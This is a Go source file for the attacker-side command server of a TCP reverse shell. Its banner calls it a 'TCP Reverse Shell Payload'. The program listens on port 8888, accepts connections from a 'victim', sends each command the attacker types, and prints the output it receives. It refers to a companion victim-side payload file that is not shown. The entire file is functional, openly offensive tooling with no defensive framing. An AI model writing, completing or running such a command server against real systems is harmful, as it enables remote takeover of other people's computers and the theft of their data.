package main

import (
	"fmt"
	"net"
)

const (
	//definite values for server
	//just change serverAddress value and if you want, you can change the port value with one of your available tcp port
	//but you will have to change the port value of the port value in target-payload.go
	serverAddress = "server's address"
	protocol = "tcp"
	port = "8888"
)

func main() {
	//it listens for victim and sends cmd commands which will be written by attacker
	//and waits for output which will be sent by victim
	fmt.Println("** TCP Reverse Shell Payload **")
	fmt.Println("**   Developer -> shiva13    **")
	fmt.Println("")
	fmt.Println("")

	listener, listenerError := listenForClient() //listening for client
	if listenerError != nil {
		fmt.Println("[*] A listener error occurred -> ", listenerError.Error())
	} else {
		fmt.Println("[*] Listening for the connection")

		for {
			connection, connectionError := acceptConnectionRequest(*listener) //accepting request of the client
			if connectionError != nil {
				fmt.Println("[*] A request accepting error occurred -> ", connectionError.Error())
			} else {
				fmt.Println("[*] The connection has been accepted successfully")

				var cmdCommand string
				fmt.Println("{*} Enter a cmd command -> ")
				_, _ = fmt.Scanln(&cmdCommand)
				sendCommandToClient(*connection, cmdCommand) //sending a cmd command to the client

				cmdOutput, readingError := takeOutputFromClient(*connection) //receiving the output of the cmd command
				if readingError != nil {
					fmt.Println("[*] A cmd error occurred -> ", readingError.Error())
				} else {
					fmt.Println("[*] The command has been executed succesfully")
					
					fmt.Println("{*}--------------------O-U-T-P-U-T--------------------{*}")
					fmt.Println(cmdOutput)
					fmt.Println("")
				}
			}
		}
	}
}

func listenForClient() (*net.Listener, error) {
	listener, listenerError := net.Listen(protocol, serverAddress + ":" + port)
	return &listener, listenerError
}

func acceptConnectionRequest(listener net.Listener) (*net.Conn, error) {
	connection, connectionError := listener.Accept()
	return &connection, connectionError
} 

func sendCommandToClient(connection net.Conn, command string) {
	connection.Write([]byte(command))
}

func takeOutputFromClient(connection net.Conn) (output string, readingError error) {
	buffer := make([]byte, 1024)
	dataLength, readingError := connection.Read(buffer)
	if readingError != nil {
		output = ""
	} else {
		output = string(buffer[:dataLength])
	}

	return
}